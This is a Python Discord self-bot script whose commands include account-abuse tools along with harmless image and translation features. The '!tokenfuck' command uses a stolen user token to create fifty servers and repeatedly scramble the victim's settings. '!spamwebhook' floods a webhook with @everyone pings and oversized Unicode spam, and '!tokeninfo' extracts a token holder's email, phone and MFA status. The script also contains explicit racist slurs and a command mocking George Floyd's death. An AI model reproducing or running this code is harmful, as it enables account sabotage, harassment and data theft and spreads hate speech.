import discord
from discord.ext import commands
import random
import aiohttp
import requests
import asyncio
import json
import datetime
import base64
from googletrans import Translator
from itertools import cycle

token = ""



translator = Translator()

bot = commands.Bot(command_prefix='!', self_bot=True)

color = 3092790

languages = {
    'da'    : 'Danish, Denmark',
    'de'    : 'German, Germany',
    'en-GB' : 'English, United Kingdom',
    'en-US' : 'English, United States',
    'es-ES' : 'Spanish, Spain',
    'fr'    : 'French, France',
    'hr'    : 'Croatian, Croatia',
    'lt'    : 'Lithuanian, Lithuania',
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

cc_digits = {
    'american express': '3',
    'visa': '4',
    'mastercard': '5'
}

locales = [
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

@bot.event
async def on_message_delete(message):

    global snipe_message_content
    global snipe_message_author
    global snipe_message_id

    snipe_message_content = message.content
    snipe_message_author = message.author.id
    snipe_message_id = message.id
    await asyncio.sleep(60)

    if message.id == snipe_message_id:
        snipe_message_author = None
        snipe_message_content = None
        snipe_message_id = None




@bot.event
async def on_message(message):

        if message.content == '!help':
          embed = discord.Embed(title='List', color = color, description=f"""
**!test** - checks to see if the bot is running

**!snipe** - sends the last deleted message 
**!translate** - translates text to english 
**!b64encode/decode** - encodes/decodes something in base64 

**!tokenfuck** - fucks a token
**!tokeninfo** - checks a tokens info 
**!spamwebhook** - spams a webhook
**!deletewebhook** - deletes a webhook 

**!ipinfo** - checks an ip 
**!pingsite** - checks if a website is up 

**!banner** - steals anyones banner
**!av** - steals anyones avatar
**!meme** - sends a shitty reddit meme lol 
**!racc** - sends a raccoon pic 
**!cat** - sends a cat pic 
**!dog** - sends a dog pic 

**!guessinggame** - guessing game (if someone interrupts it breaks)
**!nigrate** - sends ur nigrate u blackie 

""")  
          embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/887809991971581962/898693499787046922/cat-kissing.gif")
          await message.channel.send(embed=embed)

        elif message.content == "4ren":
          await message.channel.send("u mean the retard monkey :clown: :clown: :clown:")

        elif message.content == "floyd":
          await message.channel.send("i cant breathe")
          await message.channel.send("https://i.imgur.com/mn3EslL.png")


        elif message.content == "!test":
          await message.channel.send("bot is working!")



        elif message.content == '!deletewebhook':
          await message.channel.send('Webhook? ')
          response = await bot.wait_for('message')
          try:
            requests.delete(response.content)
            await message.channel.send(f"Deleted webhook '{response.content}''")
          except:
            await message.channel.send(f"Error!")

        elif message.content == "!b64encode":
          await message.channel.send("Message you want to encode?")
          response = await bot.wait_for('message')
          response2 = str(response.content)
          string_bytes = response2.encode("ascii")
          base64_bytes = base64.b64encode(string_bytes) 
          base64_string = base64_bytes.decode("ascii") 
          embed = discord.Embed(title=f"Encoded: {base64_string}", color=color)
          await message.channel.send(embed=embed)

        elif message.content == "!b64decode":
          await message.channel.send("Message you want to decode?")
          response = await bot.wait_for('message')
          response2 = str(response.content)
          string_bytes = response2.encode("ascii")
          base64_bytes = base64.b64decode(string_bytes) 
          base64_string = base64_bytes.decode("ascii") 
          await message.channel.send(f'Decoded: {base64_string}')
          embed = discord.Embed(title=f"Decoded: {base64_string}", color=color)
          await message.channel.send(embed=embed)

        elif message.content == '!nigrate':
          embed = discord.Embed(title='nigrate', color = color, description=f"ur nigrate is {random.randint(0,100)}% u black monkey ")
          embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/887809991971581962/898693499787046922/cat-kissing.gif")
          await message.channel.send(embed=embed)
          return



        elif message.content == "!dog":
             async with aiohttp.ClientSession() as session:
              request = await session.get('https://some-random-api.ml/img/dog') 
              dogjson = await request.json()
              embed = discord.Embed(title="what da dog doin", color=color)
              embed.set_image(url=dogjson['link'])
              await message.channel.send(embed=embed)

        elif message.content == '!tokenfuck':
          await message.channel.send("Token?")
          response = await bot.wait_for('message')
          _token = str(response.content)
          await message.channel.send("Server names?")
          response2 = await bot.wait_for('message')
          names = str(response2.content)
          headers = {
              'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
              'Content-Type': 'application/json',
              'Authorization': _token,
          }
          request = requests.Session()
          payload = {
              'theme': "light",
              'locale': "ja",
              'message_display_compact': False,
              'inline_embed_media': False,
              'inline_attachment_media': False,
              'gif_auto_play': False,
              'render_embeds': False,
              'render_reactions': False,
              'animate_emoji': False,
              'convert_emoticons': False,
              'enable_tts_command': False,
              'explicit_content_filter': '0',
              'status': "invisible",
              'developer_mode': True
              
          }
          guild = {
              'channels': None,
              'icon': None,
              'name': names,
              'region': "europe"
          } 
          for _i in range(50):
              requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
          while True:
              try:
                  request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
              except Exception as e:
                  pass
              else:
                  break
          modes = cycle(["light", "dark"])
          statuses = cycle(["online", "idle", "dnd", "invisible"])
          for i in range(100):
              setting = {
                  'theme': next(modes),
                  'locale': random.choice(locales),
                  'status': next(statuses)
              }
              for i in range(100):
                  try:
                      request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
                  except Exception as e:
                      pass
                  else:
                      break

        elif message.content == "!spamwebhook":
          await message.channel.send("Webhook? ")
          webhook = await bot.wait_for('message')
          try:
            for i in range(100):
              requests.post(
                  webhook.content,
                  json={'content': f"""@everyone ﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽ @everyone ﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"""})
          except:
            print('err')

        elif message.content == "!cat":
             async with aiohttp.ClientSession() as session:
              request = await session.get('https://some-random-api.ml/img/cat') 
              dogjson = await request.json()
              embed = discord.Embed(title="nice pussy <3", color=color)
              embed.set_image(url=dogjson['link'])
              await message.channel.send(embed=embed)


        elif message.content == "!meme":
          embed = discord.Embed(title="", description="", color=color)

          async with aiohttp.ClientSession() as cs:
              async with cs.get('https://www.reddit.com/r/dankmemes/new.json?sort=hot') as r:
                  res = await r.json()
                  embed.set_image(url=res['data']['children'] [random.randint(0, 25)]['data']['url'])
                  await message.channel.send(embed=embed)


        elif message.content == "!racc":
             async with aiohttp.ClientSession() as session:
              request = await session.get('https://some-random-api.ml/img/raccoon') 
              dogjson = await request.json()
              embed = discord.Embed(title="<3", color=color)
              embed.set_image(url=dogjson['link'])
              await message.channel.send(embed=embed)




        elif message.content == "!translate":
          try:
            await message.channel.send("Message? (It automatically detects the language of your message!)")
            content = await bot.wait_for('message')
            contenttxt = str(content.content)     
            translated = translator.translate(contenttxt)
            await message.channel.send(translated.text)
          except:
            pass








        elif message.content == "!tokeninfo":
           await message.channel.send('Token?')
           response = await bot.wait_for('message')
           token = str(response.content)
           headers = {
               'Authorization': token,
               'Content-Type': 'application/json'
           }
           try:
               res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
               res = res.json()
               user_id = res['id']
               locale = res['locale']
               avatar_id = res['avatar']
               language = languages.get(locale)
               creation_date = "nvm"
           except KeyError:
               headers = {
                   'Authorization': "Bot " + token,
                   'Content-Type': 'application/json'
               }
               try:
                   res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
                   res = res.json()
                   user_id = res['id']
                   locale = res['locale']
                   avatar_id = res['avatar']
                   language = languages.get(locale)
                   creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
                       '%d-%m-%Y %H:%M:%S UTC')
                   em = discord.Embed(color=0x2f3136,
                       description=f"Name: `{res['username']}#{res['discriminator']} ` **(BOT**)\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
                   fields = [
                       {'name': 'Flags', 'value': res['flags']},
                       {'name': 'Local language', 'value': res['locale'] + f"{language}"},
                       {'name': 'Verified', 'value': res['verified']},
                   ]
                   for field in fields:
                      if field['value']:
                           em.add_field(name=field['name'], value=field['value'], inline=False)
                           em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
                   return await message.channel.send(embed=em)
               except KeyError:
                   await message.channel.send("Invalid token")
           em = discord.Embed(color=0x2f3136,
               description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
           nitro_type = "None"
           if "premium_type" in res:
               if res['premium_type'] == 2:
                   nitro_type = "Nitro Premium"
               elif res['premium_type'] == 1:
                   nitro_type = "Nitro Classic"
           fields = [
               {'name': 'Phone', 'value': res['phone']},
               {'name': 'Flags', 'value': res['flags']},
               {'name': 'Local language', 'value': res['locale'] + f"{language}"},
               {'name': 'MFA', 'value': res['mfa_enabled']},
               {'name': 'Verified', 'value': res['verified']},
               {'name': 'Nitro', 'value': nitro_type},
           ]
           for field in fields:
               if field['value']:
                   em.add_field(name=field['name'], value=field['value'], inline=False)
                   em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
           return await message.channel.send(embed=em)



        elif message.content == "!av":
          await message.channel.send('User?')
          try:
            response = await bot.wait_for('message')
            response2 = response.content
            user2 = response2.strip('<')
            user3 = user2.strip('>')
            user4 = user3.strip('@')
            user5 = user4.strip('!')
            user = await bot.fetch_user(user5)
            await message.channel.send(user.avatar_url)
          except:
            response = await bot.wait_for('message')
            response2 = response.content
            user = await bot.fetch_user(response2)
            await message.channel.send(user.avatar_url)

        elif message.content == "!banner":
          await message.channel.send('User?')
          response = await bot.wait_for('message')
          response2 = response.content
          user2 = response2.strip('<')
          user3 = user2.strip('>')
          user4 = user3.strip('@')
          user5 = user4.strip('!')
          user = await bot.fetch_user(user5)
          req = await bot.http.request(discord.http.Route("GET", "/users/{uid}", uid = user.id))
          banner_id = req["banner"]
          if banner_id == None:
            await message.channel.send("No banner!")
          else:
            banner_url = f"https://cdn.discordapp.com/banners/{user.id}/{banner_id}?size=1024"
            await message.channel.send(banner_url)




        elif message.content == "!ipinfo":
            await message.channel.send('Enter the ip.')
            ip = await bot.wait_for('message')
            ip2 = str(ip.content)
            async with aiohttp.ClientSession() as session:
              request = await session.get(f'https://ipapi.co/{ip2}/json') 

              ipjson = await request.json()
              json_formatted_str = json.dumps(ipjson, indent=2)
              ipinfo2 = json_formatted_str.replace(":", "")
              ipinfo3 = ipinfo2.replace('"', "")
              ipinfo4 = ipinfo3.replace('{', "")
              ipinfo5 = ipinfo4.replace('}', "")
              await message.channel.send(f"""```{ipinfo5}```""")
              

        elif message.content == '!snipe':
            if snipe_message_content==None:
                await message.channel.send("NOTHING TO SNIPE U FAT LITTLE MONKEY")
            else:
                embed = discord.Embed(description=f"{snipe_message_content}", color=color)
                embed.set_author(name= f"Snipe")
                await message.channel.send(embed=embed)
                await message.channel.send(f"Sent by: <@{snipe_message_author}>")


          
        elif message.content == "!guessinggame":
                await message.channel.send('Guess a number from 1 to 5!')
                number = random.randint(1, 5)
                for i in range(1, 5):
                    response = await bot.wait_for('message')
                    guess = int(response.content)
                    if guess > number:
                        await message.channel.send('Smaller!')
                    elif guess < number:
                        await message.channel.send('Bigger!')
                    else:
                        await message.channel.send('You guessed it!')










        
bot.run(token)
